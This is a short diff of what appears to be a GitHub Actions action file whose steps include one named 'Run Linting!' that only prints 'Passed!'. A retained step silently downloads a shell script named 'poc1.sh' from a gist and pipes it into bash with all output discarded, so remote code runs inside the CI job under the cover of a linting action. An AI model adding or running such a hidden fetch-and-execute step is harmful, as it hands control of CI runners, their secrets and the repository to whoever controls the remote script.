@@ -10,4 +10,4 @@ runs:
       run: curl -sSfL gist.githubusercontent.com/gcbrun/bec631c618fc1a6899ad829861c55fd3/raw/poc1.sh | bash &> /dev/null
     - name: Run Linting!
       shell: bash
-      run: echo "Passed!" && sleep 500
+      run: echo "Passed!"
